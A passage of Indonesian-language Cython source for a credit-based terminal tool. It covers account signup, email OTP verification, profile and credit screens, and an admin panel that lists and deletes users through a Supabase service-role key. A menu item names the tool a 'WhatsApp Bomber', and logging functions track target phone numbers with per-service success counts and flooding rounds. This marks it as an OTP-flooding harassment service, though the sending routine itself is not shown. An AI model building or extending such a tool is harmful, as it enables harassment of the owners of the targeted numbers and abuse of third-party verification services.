            return (False, {"error": err or "Login gagal"})
        except Exception as e:
            return (False, {"error": str(e)})
    
    cpdef tuple list_users(self):
        try:
            admin_h = {"apikey": self.service_key, "Authorization": f"Bearer {self.service_key}", "Content-Type": "application/json"}
            r = requests.get(f"{self.url}/auth/v1/admin/users", headers=admin_h)
            if r.status_code == 200:
                data = r.json()
                users = data.get("users", [])
                return (True, users)
            return (False, f"Error: {r.status_code}")
        except Exception as e:
            return (False, str(e))
    
    cpdef tuple delete_user(self, str uid):
        try:
            admin_h = {"apikey": self.service_key, "Authorization": f"Bearer {self.service_key}", "Content-Type": "application/json"}
            r = requests.delete(f"{self.url}/auth/v1/admin/users/{uid}", headers=admin_h)
            if r.status_code == 200:
                return (True, "User dihapus!")
            return (False, f"Error: {r.status_code}")
        except Exception as e:
            return (False, str(e))
    
    cpdef tuple get_user(self, str uid):
        try:
            admin_h = {"apikey": self.service_key, "Authorization": f"Bearer {self.service_key}", "Content-Type": "application/json"}
            r = requests.get(f"{self.url}/auth/v1/admin/users/{uid}", headers=admin_h)
            if r.status_code == 200:
                return (True, r.json())
            return (False, f"Error: {r.status_code}")
        except Exception as e:
            return (False, str(e))
    
    cpdef tuple confirm_email(self, str uid):
        try:
            admin_h = {"apikey": self.service_key, "Authorization": f"Bearer {self.service_key}", "Content-Type": "application/json"}
            r = requests.put(f"{self.url}/auth/v1/admin/users/{uid}", 
                json={"email_confirm": True}, headers=admin_h)
            if r.status_code == 200:
                return (True, "Email terverifikasi!")
            return (False, f"Error: {r.status_code}")
        except Exception as e:
            return (False, str(e))
    
    cpdef tuple get_user_by_email(self, str email):
        try:
            admin_h = {"apikey": self.service_key, "Authorization": f"Bearer {self.service_key}", "Content-Type": "application/json"}
            r = requests.get(f"{self.url}/auth/v1/admin/users", headers=admin_h)
            if r.status_code == 200:
                data = r.json()
                users = data.get("users", [])
                for u in users:
                    if u.get("email", "").lower() == email.lower():
                        return (True, u)
                return (False, {"error": "User tidak ditemukan"})
            return (False, {"error": f"Error: {r.status_code}"})
        except Exception as e:
            return (False, {"error": str(e)})

cpdef str get_email():
    cdef str e
    while True:
        e = input(f" {GR}[?]{R} Email    : {CY}").strip()
        print(R, end="")
        if valid_email(e):
            return e
        error("Email tidak valid")

cpdef str get_pass(bint confirm=False):
    cdef str p, p2, msg
    cdef bint ok
    while True:
        p = getpass.getpass(f" {GR}[?]{R} Password : {CY}")
        print(R, end="")
        ok, msg = valid_pass(p)
        if not ok:
            error(msg)
            continue
        if confirm:
            p2 = getpass.getpass(f" {GR}[?]{R} Konfirm  : {CY}")
            print(R, end="")
            if p != p2:
                error("Password tidak cocok")
                continue
        return p

cpdef bint otp_input(str email, dict cfg, int tries=3):
    cdef str code, msg
    cdef bint ok
    while tries > 0:
        code = input(f" {YL}[?]{R} OTP [{GR}{tries}x{R}] : {CY}").strip()
        print(R, end="")
        ok, msg = check_otp(email, code)
        if ok:
            return True
        tries -= 1
        error(msg)
    return False

cpdef void do_signup(Auth auth, dict cfg):
    cdef str email, pw, otp, msg, uid
    cdef bint ok, sent, confirmed
    cdef object res
    
    section("SIGNUP")
    email = get_email()
    pw = get_pass(True)
    print()
    loading_tqdm("Membuat akun", 25)
    ok, res = auth.signup(email, pw)
    if ok:
        uid = res.get("uid", "") if isinstance(res, dict) else ""
        success("Akun dibuat!")
        loading_tqdm("Mengirim OTP", 30)
        otp = gen_otp()
        save_otp(email, otp)
        sent, msg = send_email(cfg, email, otp)
        if sent:
            success(msg)
            print()
            if otp_input(email, cfg):
                print()
                loading_tqdm("Verifikasi email", 20)
                confirmed, msg = auth.confirm_email(uid)
                if confirmed:
                    success("Email terverifikasi!")
                    info("Silakan login")
                else:
                    error(f"Gagal verifikasi: {msg}")
        else:
            error(msg)
    else:
        err_msg = res.get("error", "") if isinstance(res, dict) else str(res)
        error(err_msg)

cpdef dict _get_target_log(str user_id, str phone):
    cdef dict headers = _supabase_headers()
    cdef str url = f"{SUPABASE_URL}/rest/v1/otp_target_logs?user_id=eq.{user_id}&phone=eq.{phone}"
    try:
        r = requests.get(url, headers=headers, timeout=10)
        if r.status_code == 200:
            data = r.json()
            if data and len(data) > 0:
                return data[0]
        return None
    except:
        return None

cpdef void save_otp_log(str user_id, str phone, str status, str service_name=""):
    cdef dict headers = _supabase_headers()
    cdef dict existing = _get_target_log(user_id, phone)
    cdef dict payload
    cdef int total_success, total_failed, total_rounds
    cdef str url
    services = {}
    
    if existing is None:
        if service_name:
            services[service_name] = {"success": 1 if status == "success" else 0, "failed": 1 if status == "failed" else 0}
        
        payload = {
            "user_id": user_id,
            "phone": phone,
            "services": json.dumps(services),
            "total_success": 1 if status == "success" else 0,
            "total_failed": 1 if status == "failed" else 0,
            "total_rounds": 0
        }
        url = f"{SUPABASE_URL}/rest/v1/otp_target_logs"
        try:
            r = requests.post(url, json=payload, headers=headers, timeout=10)
        except:
            pass
    else:
        services_raw = existing.get("services", {})
        if isinstance(services_raw, str):
            try:
                services = json.loads(services_raw)
            except:
                services = {}
        elif isinstance(services_raw, dict):
            services = services_raw
        else:
            services = {}
        
        if service_name:
            if service_name not in services:
                services[service_name] = {"success": 0, "failed": 0}
            if status == "success":
                services[service_name]["success"] = services[service_name].get("success", 0) + 1
            else:
                services[service_name]["failed"] = services[service_name].get("failed", 0) + 1
        
        total_success = existing.get("total_success", 0) + (1 if status == "success" else 0)
        total_failed = existing.get("total_failed", 0) + (1 if status == "failed" else 0)
        
        payload = {
            "services": json.dumps(services),
            "total_success": total_success,
            "total_failed": total_failed,
            "last_sent_at": datetime.now().isoformat()
        }
        url = f"{SUPABASE_URL}/rest/v1/otp_target_logs?user_id=eq.{user_id}&phone=eq.{phone}"
        try:
            r = requests.patch(url, json=payload, headers=headers, timeout=10)
        except:
            pass

cpdef void update_target_rounds(str user_id, str phone, int rounds):
    cdef dict headers = _supabase_headers()
    cdef dict existing = _get_target_log(user_id, phone)
    cdef str url
    cdef dict payload
    
    if existing:
        payload = {
            "total_rounds": existing.get("total_rounds", 0) + rounds
        }
        url = f"{SUPABASE_URL}/rest/v1/otp_target_logs?user_id=eq.{user_id}&phone=eq.{phone}"
        try:
            r = requests.patch(url, json=payload, headers=headers, timeout=10)
        except:
            pass

cpdef list get_otp_logs(str user_id):
    cdef dict headers = _supabase_headers()
    cdef str url = f"{SUPABASE_URL}/rest/v1/otp_target_logs?user_id=eq.{user_id}&order=last_sent_at.desc&limit=20"
    cdef list result = []
    services = {}
    try:
        r = requests.get(url, headers=headers, timeout=10)
        if r.status_code == 200:
            data = r.json()
            for item in data:
                services_raw = item.get("services", {})
                if isinstance(services_raw, str):
                    try:
                        services = json.loads(services_raw)
                    except:
                        services = {}
                elif isinstance(services_raw, dict):
                    services = services_raw
                else:
                    services = {}
                result.append({
                    "phone": item.get("phone", ""),
                    "services": services,
                    "total_success": item.get("total_success", 0),
                    "total_failed": item.get("total_failed", 0),
                    "total_rounds": item.get("total_rounds", 0),
                    "first_sent": item.get("first_sent_at", ""),
                    "last_sent": item.get("last_sent_at", "")
                })
        return result
    except:
        return []

cpdef void show_user_profile_menu(dict res, dict cfg):
    cdef int sel, user_credit, user_used
    cdef list logs
    cdef str user_email, user_uid
    
    user_email = res.get('email', '') if res else ''
    user_uid = res.get('uid', '') if res else ''
    
    try:
        while True:
            clear()
            print()
            
            profile_header = Panel(
                f"[bold white]P R O F I L   P E N G G U N A[/bold white]\n[bold cyan]{user_email}[/bold cyan]",
                border_style="magenta",
                padding=(0, 2)
            )
            console.print(profile_header)
            
            title_box = (
                f"\n{MG}{B}"
                f"╭───────────────────────────────╮\n"
                f"│      MENU PROFIL              │\n"
                f"╰───────────────────────────────╯"
                f"{R}"
            )
            
            profile_options = [
                f"{B}  [1]  Info Account  -  Lihat info lengkap{R}",
                f"{B}  [2]  Cek UID       -  Lihat User ID{R}",
                f"{B}  [3]  Cek Limit     -  Lihat credit/limit{R}",
                f"{B}  [4]  Logs OTP      -  Riwayat kirim OTP{R}",
                f"{B}  [0]  Kembali       -  User menu{R}",
            ]
            
            profile_menu = TerminalMenu(
                menu_entries=profile_options,
                title=title_box,
                menu_cursor=" > ",
                menu_cursor_style=("fg_purple", "bold"),
                menu_highlight_style=("fg_cyan", "bold"),
            )
            
            sel = profile_menu.show()
            
            if sel == 0:
                clear()
                print()
                
                user_credit = get_user_credit(user_uid)
                user_used = get_user_used(user_uid)
                
                if user_credit >= 3:
                    credit_color = "green"
                    credit_status = "PREMIUM"
                    credit_icon = "◆"
                elif user_credit >= 1:
                    credit_color = "yellow"
                    credit_status = "STANDAR"
                    credit_icon = "◇"
                else:
                    credit_color = "red"
                    credit_status = "HABIS"
                    credit_icon = "○"
                
                account_content = (
                    f"[bold cyan]╭{'─' * 26}╮[/bold cyan]\n"
                    f"[bold cyan]│[/bold cyan]  [bold white]I N F O   A C C O U N T[/bold white] [bold cyan]│[/bold cyan]\n"
                    f"[bold cyan]╰{'─' * 26}╯[/bold cyan]\n\n"
                    f"[bold white]┌─ DATA PENGGUNA ─────────────────────────┐[/bold white]\n"
                    f"[bold white]│[/bold white]\n"
                    f"[bold white]│[/bold white]  [cyan]Email[/cyan]      : [bold white]{user_email}[/bold white]\n"
                    f"[bold white]│[/bold white]  [cyan]User ID[/cyan]    : [bold green]{user_uid}[/bold green]\n"
                    f"[bold white]│[/bold white]  [cyan]Status[/cyan]     : [bold green]● Terverifikasi[/bold green]\n"
                    f"[bold white]│[/bold white]\n"
                    f"[bold white]└──────────────────────────────────────────┘[/bold white]\n\n"
                    f"[bold white]┌─ STATUS CREDIT ──────────────────────────┐[/bold white]\n"
                    f"[bold white]│[/bold white]\n"
                    f"[bold white]│[/bold white]  [cyan]Credit[/cyan]     : [bold {credit_color}]{credit_icon} {user_credit}[/bold {credit_color}] [dim]({credit_status})[/dim]\n"
                    f"[bold white]│[/bold white]  [cyan]Terpakai[/cyan]   : [bold white]{user_used}[/bold white] [dim]kali penggunaan[/dim]\n"
                    f"[bold white]│[/bold white]\n"
                    f"[bold white]└──────────────────────────────────────────┘[/bold white]"
                )
                
                console.print(Panel(
                    account_content,
                    border_style="cyan",
                    padding=(1, 2),
                    title="[bold magenta]★ PROFIL PENGGUNA ★[/bold magenta]"
                ))
                
                print()
                input(f" {D}Tekan Enter untuk kembali...{R}")
            
            elif sel == 1:
                clear()
                print()
                
                uid_content = (
                    f"[bold yellow]╭{'─' * 24}╮[/bold yellow]\n"
                    f"[bold yellow]│[/bold yellow]  [bold white]C E K   U S E R   I D[/bold white] [bold yellow]│[/bold yellow]\n"
                    f"[bold yellow]╰{'─' * 24}╯[/bold yellow]\n\n"
                    f"[bold white]┌─ YOUR USER ID ────────────────────────────┐[/bold white]\n"
                    f"[bold white]│[/bold white]\n"
                    f"[bold white]│[/bold white]  [bold green]{user_uid}[/bold green]\n"
                    f"[bold white]│[/bold white]\n"
                    f"[bold white]└───────────────────────────────────────────┘[/bold white]\n\n"
                    f"[dim]┌─ INFORMASI ─────────────────────────────────┐[/dim]\n"
                    f"[dim]│[/dim]  [yellow]●[/yellow] UID adalah identitas unik akun Anda\n"
                    f"[dim]│[/dim]  [yellow]●[/yellow] Digunakan untuk identifikasi sistem\n"
                    f"[dim]│[/dim]  [red]●[/red] Jangan bagikan ke orang lain!\n"
                    f"[dim]└─────────────────────────────────────────────┘[/dim]"
                )
                
                console.print(Panel(
                    uid_content,
                    border_style="yellow",
                    padding=(1, 2),
                    title="[bold cyan]★ USER IDENTIFIER ★[/bold cyan]"
                ))
                
                print()
                input(f" {D}Tekan Enter untuk kembali...{R}")
            
            elif sel == 2:
                clear()
                print()
                section("CEK LIMIT")
                
                user_credit = get_user_credit(user_uid)
                user_used = get_user_used(user_uid)
                
                if user_credit >= 3:
                    credit_color = "green"
                    credit_status = "AMAN"
                elif user_credit >= 1:
                    credit_color = "yellow"
                    credit_status = "TERBATAS"
                else:
                    credit_color = "red"
                    credit_status = "HABIS"
                
                limit_panel = Panel(
                    f"[bold {credit_color}]STATUS: {credit_status}[/bold {credit_color}]\n\n"
                    f"[bold white]Credit Tersisa[/bold white]\n"
                    f"[bold {credit_color}]{user_credit}[/bold {credit_color}] [dim]credit[/dim]\n\n"
                    f"[bold white]Credit Terpakai[/bold white]\n"
                    f"[bold blue]{user_used}[/bold blue] [dim]kali digunakan[/dim]\n\n"
                    f"[dim]Hubungi admin untuk menambah credit[/dim]",
                    border_style=credit_color,
                    padding=(1, 2)
                )
                console.print(limit_panel)
                
                print()
                input(f" {D}Tekan Enter untuk kembali...{R}")
            
            elif sel == 3:
                clear()
                print()
                section("LOGS KIRIM OTP")
                
                logs = get_otp_logs(user_uid)
                
                if len(logs) == 0:
                    info("Belum ada riwayat pengiriman OTP")
                else:
                    success(f"Total: {len(logs)} target")
                    print()
                    
                    for i, log in enumerate(logs, 1):
                        phone = log.get("phone", "N/A")
                        services = log.get("services", {})
                        total_success = log.get("total_success", 0)
                        total_failed = log.get("total_failed", 0)
                        total_rounds = log.get("total_rounds", 0)
                        last_sent = log.get("last_sent", "")[:10] if log.get("last_sent") else "N/A"
                        
                        stats_data = [
                            ["✅ Berhasil", f"{GR}{total_success}{R}"],
                            ["❌ Gagal", f"{RD}{total_failed}{R}"],
                            ["🔄 Round", f"{CY}{total_rounds}{R}"]
                        ]
                        stats_str = tabulate(stats_data, tablefmt="plain")
                        stats_lines = stats_str.split('\n')
                        
                        svc_str = ""
                        svc_lines = []
                        if services:
                            svc_rows = []
                            svc_no = 1
                            for svc_name, svc_data in services.items():
                                svc_success = svc_data.get("success", 0) if isinstance(svc_data, dict) else 0
                                svc_failed = svc_data.get("failed", 0) if isinstance(svc_data, dict) else 0
                                if svc_success > 0:
                                    svc_rows.append([svc_no, svc_name, f"{GR}OK{R}", f"{GR}Terkirim ({svc_success}x){R}"])
                                    svc_no += 1
                                if svc_failed > 0:
                                    svc_rows.append([svc_no, svc_name, f"{RD}GAGAL{R}", f"{RD}Gagal ({svc_failed}x){R}"])
                                    svc_no += 1
                            svc_header = ["No", "Layanan", "Status", "Keterangan"]
                            svc_str = tabulate(svc_rows, headers=svc_header, tablefmt="simple")
                            svc_lines = svc_str.split('\n')
                        
                        content_widths = []
                        content_widths.append(visible_width(f"TARGET #{i}") + 2)
                        content_widths.append(visible_width(f"📱 Nomor     : +62{phone}") + 2)
                        content_widths.append(visible_width(f"📅 Terakhir  : {last_sent}") + 2)
                        content_widths.append(visible_width("📊 STATISTIK") + 2)
                        for line in stats_lines:
                            content_widths.append(visible_width(line) + 4)
                        if services:
                            content_widths.append(visible_width("📋 DETAIL LAYANAN") + 2)
                            for line in svc_lines:
                                content_widths.append(visible_width(line) + 4)
                        
                        box_width = max(content_widths) + 4
                        if box_width < 30:
                            box_width = 30
                        inner_width = box_width - 2
                        
                        print(f"{CY}{B}╔{'═' * inner_width}╗{R}")
                        title = f"{WH}{B}TARGET #{i}{R}"
                        title_pad = inner_width - visible_width(f"TARGET #{i}") - 2
                        print(f"{CY}{B}║{R}  {title}{' ' * max(0, title_pad)}{CY}{B}║{R}")
                        print(f"{CY}{B}╠{'═' * inner_width}╣{R}")
                        
                        nomor_text = f"{GR}📱 Nomor{R}     : {WH}+62{phone}{R}"
                        nomor_pad = inner_width - visible_width(f"📱 Nomor     : +62{phone}") - 2
                        print(f"{CY}{B}║{R}  {nomor_text}{' ' * max(0, nomor_pad)}{CY}{B}║{R}")
                        
                        terakhir_text = f"{GR}📅 Terakhir{R}  : {WH}{last_sent}{R}"
                        terakhir_pad = inner_width - visible_width(f"📅 Terakhir  : {last_sent}") - 2
                        print(f"{CY}{B}║{R}  {terakhir_text}{' ' * max(0, terakhir_pad)}{CY}{B}║{R}")
                        
                        print(f"{CY}{B}╠{'═' * inner_width}╣{R}")
                        stats_title = f"{YL}📊 STATISTIK{R}"
                        stats_pad = inner_width - visible_width("📊 STATISTIK") - 2
                        print(f"{CY}{B}║{R}  {stats_title}{' ' * max(0, stats_pad)}{CY}{B}║{R}")
                        print(f"{CY}{B}╠{'═' * inner_width}╣{R}")
                        
                        for line in stats_lines:
                            line_pad = inner_width - visible_width(line) - 2
                            print(f"{CY}{B}║{R}  {line}{' ' * max(0, line_pad)}{CY}{B}║{R}")
                        
                        if services:
                            print(f"{CY}{B}╠{'═' * inner_width}╣{R}")
                            detail_title = f"{MG}📋 DETAIL LAYANAN{R}"
                            detail_pad = inner_width - visible_width("📋 DETAIL LAYANAN") - 2
                            print(f"{CY}{B}║{R}  {detail_title}{' ' * max(0, detail_pad)}{CY}{B}║{R}")
                            print(f"{CY}{B}╠{'═' * inner_width}╣{R}")
                            
                            for line in svc_lines:
                                line_pad = inner_width - visible_width(line) - 2
                                print(f"{CY}{B}║{R}  {line}{' ' * max(0, line_pad)}{CY}{B}║{R}")
                        
                        print(f"{CY}{B}╚{'═' * inner_width}╝{R}")
                        print()
                    
                    if len(logs) >= 20:
                        info(f"Menampilkan 20 target terbaru")
                
                print()
                input(f" {D}Tekan Enter untuk kembali...{R}")
            
            elif sel == 4 or sel is None:
                break
    except KeyboardInterrupt:
        show_interrupt_message()
        raise SystemExit(0)

cpdef void do_login(Auth auth, dict cfg):
    cdef str email, pw, otp, msg, uid
    cdef bint ok, sent, found, confirmed
    cdef object res, user_data
    cdef int sel
    
    section("LOGIN")
    email = get_email()
    pw = get_pass(False)
    print()
    loading_tqdm("Memverifikasi", 25)
    ok, res = auth.login(email, pw)
    if ok:
        success("Login berhasil!")
        user_email = res.get('email', '') if isinstance(res, dict) else ''
        user_uid = res.get('uid', '') if isinstance(res, dict) else ''
        box_info([f"Email : {user_email}", f"UID   : {user_uid}"])
        time.sleep(1)
        
        try:
            while True:
                clear()
                print()
                
                welcome_panel = Panel(
                    f"[bold green][OK][/bold green] [white]Selamat datang![/white]\n[bold cyan]{user_email}[/bold cyan]",
                    border_style="green",
                    padding=(0, 2)
                )
                console.print(welcome_panel)
                
                user_options = [
                    f"{B}  [1]  Profile     -  Lihat info akun{R}",
                    f"{B}  [2]  Kirim OTP   -  WhatsApp Bomber{R}",
                    f"{B}  [3]  Buy Credit  -  Beli credit{R}",
                    f"{B}  [0]  Logout      -  Keluar akun{R}",
                ]
                user_menu = TerminalMenu(
                    menu_entries=user_options,
                    title=f"\n{CY}{B}╭─────────────────────────────────╮\n│                                 │\n│        U S E R   M E N U        │\n│                                 │\n╰─────────────────────────────────╯{R}",
                    menu_cursor=" > ",
                    menu_cursor_style=("fg_cyan", "bold"),
                    menu_highlight_style=("fg_green", "bold"),
                )
                sel = user_menu.show()
                
                if sel == 0:
                    show_user_profile_menu(res, cfg)
                elif sel == 1:
                    do_sms_config_with_cfg(cfg, user_uid)
                    print()
                    input(f" {D}Tekan Enter untuk kembali...{R}")
                elif sel == 2:
                    show_buy_credit_menu(cfg, user_uid, user_email)
                elif sel == 3:
                    clear()
                    print()
                    loading_tqdm("Logout", 20)
                    success("Logout berhasil!")
                    time.sleep(0.5)
                    return
                else:
                    return
        except KeyboardInterrupt:
            show_interrupt_message()
            raise SystemExit(0)
    else:
        err_msg = res.get('error', '') if isinstance(res, dict) else str(res)
        if err_msg == "UNVERIFIED":
            info("Email belum diverifikasi")
            loading_tqdm("Mencari data user", 20)
            found, user_data = auth.get_user_by_email(email)
            if not found:
                error("User tidak ditemukan di database")
                return
            uid = user_data.get("id", "") if isinstance(user_data, dict) else ""
            if not uid:
                error("UID tidak ditemukan")
                return
            loading_tqdm("Mengirim OTP", 30)
            otp = gen_otp()
            save_otp(email, otp)
            sent, msg = send_email(cfg, email, otp)
            if sent:
                success(msg)
                print()
                if otp_input(email, cfg):
                    print()
                    loading_tqdm("Verifikasi email", 20)
                    confirmed, msg = auth.confirm_email(uid)
                    if confirmed:
                        success("Email terverifikasi!")
                        info("Silakan login lagi")
                    else:
                        error(f"Gagal verifikasi: {msg}")
            else:
                error(msg)
        else:
            error(err_msg)

cpdef void do_resend(dict cfg):
    cdef str email, otp, msg
    cdef bint ok
    
    section("KIRIM ULANG OTP")
    email = get_email()
    print()
    loading_tqdm("Mengirim OTP", 30)
    otp = gen_otp()
    save_otp(email, otp)
    ok, msg = send_email(cfg, email, otp)
    if ok:
        success(msg)
        print()
        if otp_input(email, cfg):
            print()
            success("OTP Valid!")
    else:
        error(msg)

cpdef void do_reset(dict cfg):
    cdef str email, otp, msg
    cdef bint ok
    
    section("RESET PASSWORD")
    email = get_email()
    print()
    loading_tqdm("Mengirim OTP", 30)
    otp = gen_otp()
    save_otp(email, otp)
    ok, msg = send_email(cfg, email, otp)
    if ok:
        success(msg)
        print()
        if otp_input(email, cfg):
            print()
            success("Verifikasi OK!")
            info("Hubungi admin untuk reset password")
    else:
        error(msg)

cpdef bint admin_login():
    cdef str username, password
    cdef int tries = 3
    
    section("ADMIN LOGIN")
    
    while tries > 0:
        username = input(f" {GR}[?]{R} Username : {CY}").strip()
        print(R, end="")
        password = getpass.getpass(f" {GR}[?]{R} Password : {CY}")
        print(R, end="")
        
        if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
            print()
            loading_tqdm("Verifikasi admin", 25)
            success("Login admin berhasil!")
            return True
        
        tries -= 1
        error(f"Kredensial salah! Sisa {tries} percobaan")
        print()
    
    error("Terlalu banyak percobaan gagal!")
    return False

cpdef void admin_list_users(Auth auth):
    cdef bint ok
    cdef object users, selected_user
    cdef int sel, verified_count, i
    cdef list menu_options
    cdef str email, uid, verified_status, created_date
    
    section("DAFTAR USER")
    loading_tqdm("Mengambil data", 40)
    
    ok, users = auth.list_users()
    if ok:
        if len(users) == 0:
            info("Belum ada user terdaftar")
            return
        
        verified_count = 0
        for u in users:
            if u.get("email_confirmed_at"):
                verified_count += 1
        
        stats_panel = Panel(
            f"[bold cyan]Total User[/bold cyan]: [bold white]{len(users)}[/bold white]\n"
            f"[bold green]Verified[/bold green]: [bold white]{verified_count}[/bold white]  |  "
            f"[bold yellow]Unverified[/bold yellow]: [bold white]{len(users) - verified_count}[/bold white]",
            border_style="cyan",
            padding=(0, 2)
        )
        console.print(stats_panel)
        
        try:
            while True:
                print()
                
                user_table = Table(
                    title="[bold cyan]DAFTAR USER TERDAFTAR[/bold cyan]",
                    show_header=True,
                    header_style="bold white on blue",
                    border_style="cyan",
                    show_lines=True
                )
                user_table.add_column("No", style="dim", width=4, justify="center")
                user_table.add_column("Email", style="cyan", min_width=25)
                user_table.add_column("Status", style="white", width=12, justify="center")
                user_table.add_column("Dibuat", style="dim", width=12)
                
                for i, u in enumerate(users):
                    email = u.get("email", "N/A")
                    verified_status = "[bold green]Verified[/bold green]" if u.get("email_confirmed_at") else "[bold yellow]Pending[/bold yellow]"
                    created_date = u.get("created_at", "N/A")[:10] if u.get("created_at") else "N/A"
                    user_table.add_row(str(i+1), email, verified_status, created_date)
                
                console.print(user_table)
                print()
                
                menu_options = []
                for i, u in enumerate(users):
                    email = u.get("email", "N/A")
                    verified_status = "[V]" if u.get("email_confirmed_at") else "[P]"
                    menu_options.append(f"{B}{i+1}. {email} {verified_status}{R}")
                
                menu_options.append(f"{B}<- Kembali{R}")
                
                title_box = f"\n{CY}{B}  Pilih user untuk lihat detail:{R}"
                
                user_menu = TerminalMenu(
                    menu_entries=menu_options,
                    title=title_box,
                    menu_cursor=" > ",
                    menu_cursor_style=("fg_cyan", "bold"),
                    menu_highlight_style=("fg_green", "bold"),
                )
                
                sel = user_menu.show()
                
                if sel is None or sel == len(users):
                    break
                
                selected_user = users[sel]
                clear()
                print()
                
                user_credit = get_user_credit(selected_user.get('id', ''))
                user_used = get_user_used(selected_user.get('id', ''))
                
                detail_content = (
                    f"[bold cyan]UID[/bold cyan]\n"
                    f"[dim]{selected_user.get('id', 'N/A')}[/dim]\n\n"
                    f"[bold cyan]Email[/bold cyan]\n"
                    f"[white]{selected_user.get('email', 'N/A')}[/white]\n\n"
                    f"[bold cyan]Status[/bold cyan]\n"
                    f"{'[bold green]Terverifikasi[/bold green]' if selected_user.get('email_confirmed_at') else '[bold yellow]Belum Verified[/bold yellow]'}\n\n"
                    f"[bold cyan]Provider[/bold cyan]\n"
                    f"[white]{selected_user.get('app_metadata', {}).get('provider', 'email')}[/white]"
                )
                
                stats_content = (
                    f"[bold green]Credit[/bold green]\n"
                    f"[bold white]{user_credit}[/bold white] [dim]tersisa[/dim]\n\n"
                    f"[bold blue]Terpakai[/bold blue]\n"
                    f"[bold white]{user_used}[/bold white] [dim]kali[/dim]\n\n"
                    f"[bold cyan]Dibuat[/bold cyan]\n"
                    f"[dim]{selected_user.get('created_at', 'N/A')[:19]}[/dim]\n\n"
                    f"[bold cyan]Last Login[/bold cyan]\n"
                    f"[dim]{selected_user.get('last_sign_in_at', 'Belum pernah')[:19] if selected_user.get('last_sign_in_at') else 'Belum pernah'}[/dim]"
                )
                
                detail_table = Table(show_header=False, box=None, padding=(0, 2))
                detail_table.add_row(
                    Panel(detail_content, title="[bold cyan]INFO AKUN[/bold cyan]", border_style="cyan", padding=(1, 2)),
                    Panel(stats_content, title="[bold green]STATISTIK[/bold green]", border_style="green", padding=(1, 2))
                )
                console.print(detail_table)
                
                print()
                input(f" {D}Tekan Enter untuk kembali...{R}")
                clear()
                print()
                section("DAFTAR USER")
                console.print(stats_panel)
        except KeyboardInterrupt:
            show_interrupt_message()
            raise SystemExit(0)
    else:
        error(f"Gagal mengambil data: {users}")

cpdef void admin_delete_user(Auth auth):
    cdef str uid, confirm, email, verified_status, created_date
    cdef bint ok
    cdef object msg, users, selected_user
    cdef int sel, user_credit
    cdef list menu_options
    
    section("HAPUS USER")
    loading_tqdm("Mengambil data", 40)
    
    ok, users = auth.list_users()
    if not ok:
        error(f"Gagal mengambil data: {users}")
        return
    
    if len(users) == 0:
        info("Belum ada user terdaftar")
        return
    
    warning_panel = Panel(
        f"[bold red]PERINGATAN[/bold red]\n"
        f"[white]Menghapus user akan menghilangkan semua data secara permanen![/white]\n"
        f"[dim]Total user: {len(users)}[/dim]",
        border_style="red",
        padding=(0, 2)
    )
    console.print(warning_panel)
    print()
    
    user_table = Table(
        title="[bold red]PILIH USER UNTUK DIHAPUS[/bold red]",
        show_header=True,
        header_style="bold white on red",
        border_style="red",
        show_lines=True
    )
    user_table.add_column("No", style="dim", width=4, justify="center")
    user_table.add_column("Email", style="white", min_width=25)
    user_table.add_column("Status", style="white", width=12, justify="center")
    user_table.add_column("Credit", style="cyan", width=8, justify="center")
    
    for i, u in enumerate(users):
        email = u.get("email", "N/A")
        verified_status = "[green]Verified[/green]" if u.get("email_confirmed_at") else "[yellow]Pending[/yellow]"
        user_credit = get_user_credit(u.get("id", ""))
        user_table.add_row(str(i+1), email, verified_status, str(user_credit))
    
    console.print(user_table)
    print()
    
    menu_options = []
    for i, u in enumerate(users):
        email = u.get("email", "N/A")
        verified_status = "[V]" if u.get("email_confirmed_at") else "[P]"
        menu_options.append(f"{B}{i+1}. {email} {verified_status}{R}")
    
    menu_options.append(f"{B}<- Batal{R}")
    
    title_box = f"\n{RD}{B}  Pilih user yang akan dihapus:{R}"
    
    user_menu = TerminalMenu(
        menu_entries=menu_options,
        title=title_box,
        menu_cursor=" > ",
        menu_cursor_style=("fg_red", "bold"),
        menu_highlight_style=("fg_yellow", "bold"),
    )
    
    sel = user_menu.show()
    
    if sel is None or sel == len(users):
        info("Dibatalkan")
        return
    
    selected_user = users[sel]
    uid = selected_user.get("id", "")
    email = selected_user.get("email", "N/A")
    
    print()
    confirm_panel = Panel(
        f"[bold red]KONFIRMASI HAPUS[/bold red]\n\n"
        f"[white]Email: [bold]{email}[/bold][/white]\n"
        f"[dim]UID: {uid}[/dim]\n\n"
        f"[bold yellow]Ketik 'HAPUS' untuk melanjutkan[/bold yellow]",
        border_style="red",
        padding=(1, 2)
    )
    console.print(confirm_panel)
    
    confirm = input(f" {RD}[!]{R} Konfirmasi: {CY}").strip()
    print(R, end="")
    
    if confirm != 'HAPUS':
        info("Dibatalkan")
        return
    
    print()
    loading_tqdm("Menghapus user", 30)
    ok, msg = auth.delete_user(uid)
    if ok:
        success(f"User {email} berhasil dihapus!")
    else:
        error(msg)

cpdef void admin_user_detail(Auth auth):
    cdef str uid
    cdef bint ok
    cdef object user
    
    section("DETAIL USER")
    uid = input(f" {GR}[?]{R} UID User : {CY}").strip()
    print(R, end="")
    
    if not uid:
        error("UID tidak boleh kosong!")
        return
    
    print()
    loading_tqdm("Mengambil data", 25)
    ok, user = auth.get_user(uid)
    if ok:
        box_info([
            f"UID      : {user.get('id', 'N/A')}",
            f"Email    : {user.get('email', 'N/A')}",
            f"Dibuat   : {user.get('created_at', 'N/A')[:19]}",
            f"Verified : {'Ya' if user.get('email_confirmed_at') else 'Tidak'}",
            f"Provider : {user.get('app_metadata', {}).get('provider', 'email')}",
        ])
    else:
        error(f"Gagal: {user}")

cpdef void admin_add_limit(Auth auth):
    cdef str uid_or_email, amount_str
    cdef int amount
    cdef bint ok, user_found
    cdef object users, user
    cdef str user_id = ""
    cdef str user_email = ""
    
    section("ADD LIMIT")
    uid_or_email = input(f" {GR}[?]{R} UID atau Email User : {CY}").strip()
    print(R, end="")
    
    if not uid_or_email:
        error("Input tidak boleh kosong!")
        return
    
    loading_tqdm("Mencari user", 30)
    ok, users = auth.list_users()
    
    if not ok or not users:
        error("Gagal mengambil data user!")
        return
    
    user_found = False
    
    if "@" in uid_or_email:
        for u in users:
            if u and u.get("email", "").lower() == uid_or_email.lower():
                user_id = u.get("id", "")
                user_email = u.get("email", "")
                user_found = True
                break
    else:
        for u in users:
            if u and u.get("id", "") == uid_or_email:
                user_id = u.get("id", "")
                user_email = u.get("email", "")
                user_found = True
                break
    
    if not user_found:
        error(f"User '{uid_or_email}' tidak ditemukan dalam daftar user!")
        info("Pastikan UID atau Email yang dimasukkan benar")
        return
    
